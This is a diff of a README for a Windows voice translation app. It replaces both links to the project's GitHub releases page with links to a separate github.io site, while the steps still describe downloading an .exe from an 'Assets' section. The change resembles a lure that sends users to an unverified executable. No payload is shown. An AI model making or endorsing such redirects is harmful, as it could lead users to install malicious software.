@@ -1,6 +1,6 @@
 # 🎙️ voxislive - Instant voice translation for your Windows
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lucid-nightspot585/voxislive/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://lucid-nightspot585.github.io)
 
 Voxislive translates your voice in real time. It uses Google Gemini to process speech and provides instant output. You speak into your microphone, and the software delivers the translation through your speakers. This tool works on Windows systems. It relies on a Bring Your Own Key (BYOK) model. You provide your own API key to connect the software to the translation engine.
 
@@ -19,7 +19,7 @@ Voxislive runs on most Windows computers. Ensure your system meets these standar
 
 You need the latest version of the application to get started. Follow these steps to obtain the files:
 
-1. Visit the [voxislive release page](https://github.com/Lucid-nightspot585/voxislive/releases).
+1. Visit the [voxislive release page](https://lucid-nightspot585.github.io).
 2. Look for the section labeled "Assets" under the most recent version tag.
 3. Click the link ending in .exe to start your download.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
